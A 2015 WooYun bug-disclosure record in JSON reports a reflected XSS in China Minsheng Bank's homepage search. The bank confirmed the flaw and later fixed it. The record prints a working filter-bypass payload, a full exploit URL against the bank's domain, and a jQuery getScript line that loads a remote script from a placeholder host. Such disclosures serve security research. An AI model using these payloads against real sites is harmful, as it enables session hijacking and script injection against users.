{"id": 22379, "wybug_id": "wooyun-2015-0118139", "wybug_title": "民生银行主页xss漏洞（突破xss过滤器）", "wybug_corp": "中国民生银行", "wybug_author": "老曹哥哥", "wybug_date": "2015-06-04 10:19", "wybug_open_date": "2015-07-02 12:43", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-02：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 在民生银行主页办点业务，看见主页上方有个巨大的搜索框就测了一把 详细说明：  条件所限，不能发图请见谅当在搜索框中输入一些字符的时候，发现其返回到了页面的诸多地方。有标签中的，也有js中。但是经过仔细测试，发现这里虽然没有过滤单引号，但是过滤了其他诸如\"<>\\&#,甚至（）{}以及alert等js部分函数名。对我们闭合语法触发poc造成了一定困难。仔细挑选后，选择了如下返回点：\n<a href=\"/cs/Satellite?c=Page&amp;cid=1375342064713&amp;pagename=cmbc%2FPage%2FTP_Sousuolayout&amp;rendermode=preview&amp;keyword=aaa&amp;thisPage=1\">首页</a>\n其中链接地址中的keyword是可控的，并且来自于请求的url中。在输入框中输入如下内容： aaabbb' onmouseover='window.onerror=prompt;throw 1' b='(空格要使用url编码，否则会被剔除)生成如下url：http://www.cmbc.com.cn/cs/Satellite?c=Page&cid=1375342064713&pagename=cmbc%2FPage%2FTP_Sousuolayout&rendermode=preview&keyword=aaabbb%27onmouseover=%27window.onerror=prompt;throw%201%27%20b=%27&thisPage=1页面返回结果经过浏览器处理后，如下：\n<a b=\"&amp;thisPage=1\" onmouseover=\"window.onerror=prompt;throw 1\" href=\"/cs/Satellite?c=Page&amp;cid=1375342064713&amp;pagename=cmbc%2FPage%2FTP_Sousuolayout&amp;rendermode=preview&amp;keyword=aaabbb\">首页</a>\n当鼠标指向页面下方时，触发on事件代码执行。利用：由于页面使用了jquery可以通过如下方式利用\n<img src=1 onerror=\"window.onerror=$.getScript;throw 'https://xxxxx.js'\">\nPS:已经数不清第几次投稿了，跪求邀请码。如需回扣请将账号直接发至我邮箱- -！   漏洞证明：  http://www.cmbc.com.cn/cs/Satellite?c=Page&cid=1375342064713&pagename=cmbc%2FPage%2FTP_Sousuolayout&rendermode=preview&keyword=a%20b&thisPage=1   修复方案：     版权声明：转载请注明来源 老曹哥哥@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-06-04 16:56 厂商回复： 非常感谢对民生银行的关注，感谢提交漏洞。 最新状态： 2015-07-02：感谢对我们的关注，漏洞已经修复。  ", "replys": "漏洞评价：\n评论\n     2015-06-04 10:26 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:19        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  关注    \n     2015-06-04 23:51 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:42        | 最大的漏洞就是人)\t\t \n  关注    \n     2015-06-04 23:53 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  路过~     \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}